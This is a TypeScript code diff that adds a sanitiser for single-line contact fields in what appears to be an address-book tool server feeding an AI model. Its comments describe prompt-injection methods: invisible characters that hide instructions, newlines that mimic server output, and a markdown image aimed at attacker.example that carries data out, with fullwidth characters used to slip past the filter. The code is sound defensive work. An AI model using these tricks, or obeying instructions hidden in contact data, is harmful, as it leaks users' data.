@@ -31,6 +31,20 @@ import { randomUUID } from 'node:crypto';
 export const MAX_TEXT_CHARS = 2_000;
 
 /**
+ * Cap on a single-line field — a name, an organisation, an email address.
+ *
+ * Separate from {@link MAX_TEXT_CHARS} because these fields are not documents.
+ * A listing is a hundred of them, and without a ceiling one card can spend most
+ * of the result budget on its own `FN`: nothing in the protocol bounds a
+ * property value below the size of the whole resource.
+ *
+ * 400 rather than something tighter because a real `ADR` label, joined from
+ * seven components, runs past 200 and truncating a real address is a worse
+ * outcome than carrying a long one.
+ */
+export const MAX_SHORT_TEXT_CHARS = 400;
+
+/**
  * Zero-width and directional-override characters. They are invisible to the
  * human reading a contact's name but not to the model, which makes them the
  * cheapest way to hide an instruction inside otherwise innocent text.
@@ -148,8 +162,11 @@ export interface SecuritySignals {
 /**
  * Removes the characters a human reader cannot see but the model can.
  *
- * Applied to every field, not only to the long ones: an address book's *display
- * name* is chosen by whoever shared it and reaches the model through
+ * The first pass of both {@link sanitizeText} and {@link sanitizeShortText},
+ * and never used on its own for a value that reaches the model: on its own it
+ * is not a sanitiser, it is one third of one. Every field goes through one of
+ * those two, not only the long ones — an address book's *display name* is
+ * chosen by whoever shared it and reaches the model through
  * `list_address_books` long before anybody opens a card in it.
  */
 export function stripInvisible(input: string): string {
@@ -276,6 +293,35 @@ export function sanitizeText(input: string, maxChars = MAX_TEXT_CHARS): string {
     .trim();
   return normalized.length > maxChars
     ? `${normalized.slice(0, maxChars)}\n… (truncated at ${maxChars} characters — get_contact returns the full text)`
+    : normalized;
+}
+
+/**
+ * The same treatment for a field that is one line rather than a document.
+ *
+ * `sanitizeText` is written for `NOTE`: it keeps paragraph breaks, because a
+ * note has them. Everything else on a card is single-line by construction — a
+ * newline in an `FN` is either an escape a client mangled or somebody buying
+ * themselves a second line that reads like the server talking — so whitespace
+ * collapses to single spaces here, and the cap is the short one.
+ *
+ * The three passes that matter are the same ones and in the same order, and
+ * this is why a separate helper exists rather than a second argument:
+ * {@link stripInvisible} alone was what these fields used to get, and
+ * `FN:![a](https://attacker.example/x.png?d=…)` came back through
+ * `list_contacts` verbatim, outside any fence, for a client to render and
+ * fetch. NFKC first, because the fullwidth `！［］（）` fold *into* markdown
+ * image syntax and defusing before normalising misses them.
+ */
+export function sanitizeShortText(
+  input: string,
+  maxChars = MAX_SHORT_TEXT_CHARS
+): string {
+  const normalized = defuseAutoFetch(stripInvisible(input.normalize('NFKC')))
+    .replace(/\s+/g, ' ')
+    .trim();
+  return normalized.length > maxChars
+    ? `${normalized.slice(0, maxChars)}…`
     : normalized;
 }
 
